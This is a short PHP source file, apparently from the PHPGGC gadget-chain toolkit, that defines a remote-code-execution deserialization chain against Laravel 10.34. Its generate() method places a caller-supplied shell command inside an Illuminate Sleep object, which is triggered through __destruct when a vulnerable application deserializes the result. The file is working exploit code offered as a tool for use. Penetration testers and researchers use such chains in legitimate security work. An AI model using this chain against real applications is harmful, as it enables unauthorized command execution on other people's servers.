<?php

namespace GadgetChain\Laravel;

class RCE19 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '10.34';
    public static $vector = '__destruct';
    public static $author = 'Fenrisk (Maxime Rinaudo)';
    public static $information = '';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];
        
        return new \Illuminate\Support\Sleep($command);
    }
}
